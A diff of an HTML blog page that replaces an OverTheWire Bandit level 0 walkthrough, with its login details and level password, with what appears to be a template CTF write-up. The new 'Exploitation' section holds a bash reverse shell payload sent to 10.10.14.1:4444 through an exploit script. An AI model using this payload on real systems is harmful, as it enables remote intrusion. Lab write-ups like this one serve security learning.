@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>Bandit 0->1</title>
-  <link rel="icon" type="image/x-icon" href="favicon.png"/>
   <link rel="stylesheet" href="style.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -64,17 +63,14 @@
       </iframe>
     </div>
 
-    <h2 class="blog-subtitle first-subtitle">SSH to bandit0</h2>
+    <h2 class="blog-subtitle first-subtitle">🔍 Reconnaissance</h2>
     <p class="blog-text">
-      Username: bandit0<br>
-      Password: bandit0<br>
-      Host: bandit.labs.overthewire.org<br>
-      Port: 2220
+      I started with an Nmap scan to identify open ports and services running on the machine.
     </p>
     <div class="blog-code">
-<pre><code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code></pre>
+<pre><code>nmap -sC -sV -oN initial_scan.txt 10.10.10.123</code></pre>
     </div>
-    <!-- <img src="images/nmap-output.jpg" alt="Nmap Scan" class="blog-image"> -->
+    <img src="images/nmap-output.jpg" alt="Nmap Scan" class="blog-image">
   </div>
 
   <!-- Horizontal Ad after first section -->
@@ -91,20 +87,14 @@
   </div>
 
   <div class="blog-section">
-    <h2 class="blog-subtitle">CAT the readme file</h2>
+    <h2 class="blog-subtitle">💥 Exploitation</h2>
     <p class="blog-text">
-      Check list of files in the home directory of user bandit0
+      A vulnerable web server running an outdated CMS was discovered. I crafted a payload using a known RCE exploit.
     </p>
     <div class="blog-code">
-<pre><code>ls</code></pre>
+<pre><code>python exploit.py --url http://10.10.10.123 --payload 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'</code></pre>
     </div>
-    <p class="blog-text">
-      CAT the readme file
-    </p>
-    <div class="blog-code">
-<pre><code>cat readme</code></pre>
-    </div>
-    <!-- <img src="images/nmap-output.jpg" alt="Exploit Screenshot" class="blog-image"> -->
+    <img src="images/nmap-output.jpg" alt="Exploit Screenshot" class="blog-image">
   </div>
 
   <!-- Horizontal Ad after second section -->
@@ -121,25 +111,16 @@
   </div>
 
   <div class="blog-section">
-    <h2 class="blog-subtitle">🏁 Bonus</h2>
+    <h2 class="blog-subtitle">🏁 Privilege Escalation</h2>
     <p class="blog-text">
-      You can copy those remote(bandit) files to your own system(kali). <br>
-      First, start a new terminal in kali.
-      To copy the bandit0's readme file to the Desktop of kali linux. Do the following:
-      
+      After gaining a shell as `www-data`, I checked for sudo permissions and found a misconfigured binary.
     </p>
     <div class="blog-code">
-<pre><code>scp -P 2220 bandit0@bandit.labs.overthewire.org:~/readme ~/Desktop/</code></pre>
+<pre><code>sudo /usr/bin/vuln_binary</code></pre>
     </div>
     <p class="blog-text">
-      When asked for password, give the user's(bandit0) password. <br>
-      Now you can go to Desktop and cat the file.
+      Using `GTFObins`, I escalated to root.
     </p>
-    <div class="blog-code">
-      <pre><code>cd ~/Desktop/</code></pre>
-      <pre><code>cat readme</code></pre>
-      <pre><code>ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If</code></pre>
-    </div>
   </div>
 
   <!-- Horizontal Ad after third section -->
@@ -156,9 +137,9 @@
   </div>
 
   <div class="blog-section">
-    <h2 class="blog-subtitle">That's it Folks!</h2>
+    <h2 class="blog-subtitle">Conclusion</h2>
     <p class="blog-text">
-        Happy hacking!
+        Now you know how to write a blog. Happy hacking!
     </p>
   </div>
 </div>
